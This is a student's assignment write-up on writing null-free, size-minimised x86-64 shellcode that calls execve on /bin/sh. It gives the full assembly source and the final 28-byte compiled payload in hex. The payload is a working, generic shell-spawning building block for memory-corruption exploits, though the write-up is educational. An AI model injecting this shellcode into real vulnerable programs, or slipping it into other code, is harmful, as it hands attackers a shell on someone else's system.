# Assignment 1
Assembly review - The goal is create shell code that makes a syscall to /bin/sh with two side goals of having no zero bytes in the compiled code and making the compiled code as small as possible. 

## Basic Code
We start by adding the prologue and epilogue, which properly sets up and takes down the program when it is complete. To make a proper syscall to the OS we need to set RAX with the sycall number, in our case 59 or 0x3b. We also have to set the arguments for the syscall, for execv there are 3 but the only one we care about is the first argument. The first argument is a pointer to a string that has the location of the program to replace the current program with, /bin/sh. After converting the string to hex, we push it to the stack in reverse because of little endian. We then XOR the RSI and RDX registers with themselves to zero them because those are for the 2nd and 3rd arguments. We then can make the syscall to OS.

## Removing zeros
One of the side goals was to remove all zero bytes from the compiled code so that if we need to pass the code in as a string to another program, it wont cause issues for null terminated strings. There was two problem areas, moving the string to the stack, and filling the RAX register. Since RAX is 8 bytes total using 'mov $0x3b, %rdx' will produce many zero bytes when compiling, because it needs to convert the immediate value into a 8 byte version. The way we get around this is by moving the single byte $0x3b into the lower half of the AX register, which is also 1 byte. And to deal with the string zero byte, we append 0xff to the front of the string the shift the register 8 times to remove the appended 0xff and add the null bytes to the end of the string without having any zero bytes in the compiled code.

## Making code smaller
I tried alot of things to try and reduce the size of the compiled code. I tried crafting the string in a way that I could shift it less, but that didn't change the size of the code because the shift instruction will be the same size for all shifts less than 255(a byte). I tried finding a more efficient way to zero a register instead of XOR, but I didn't find anything. The instruction that takes the most space by far is moving the string into RDI, but the instruction itself is only 2 bytes and the bulk of it is the string itself. I tried finding a more compact way to get to that string by multiplying or shifting the register, but it was quite complex and didn't bring any results. So the only thing I did actually do to reduce the size was remove the prologue and epilogue, which is bad practice but did shrink my code down to 28 bytes total.
~~~
# Jacob Yoder
# 2/2/2024
# A simple shellcode to make a syscall with execv to /bin/sh. 
.text
.global _start
_start:

        # Obviously its good practice to include the prologue and epilogue.
        # BUT, I am going for smallest compiled size without null characters.

        #push %rbp
        #mov %rsp, %rbp

        mov $0x68732F6E69622FFF, %rdi   # fills rdi with "0xFF /bin/sh"
        shr $0x8, %rdi                  # shifts rdi, "/bin/sh\0"
        push %rdi                       # push string to stack

        mov $0x3b, %al                  # fill rax with execv syscall
        mov %rsp, %rdi                  # arg 1 - pointer to string of dest
        xor %rsi, %rsi                  # arg 2 - args or NULL in our case
        xor %rdx, %rdx                  # arg 3 - eviron pointer or NULL in our case

        syscall

        #leave
        #ret
~~~

My compiled shellcode is 28 bytes long:

48 bf ff 2f 62 69 6e 2f 
73 68 48 c1 ef 08 57 b0 
3b 48 89 e7 48 31 f6 48 
31 d2 0f 05
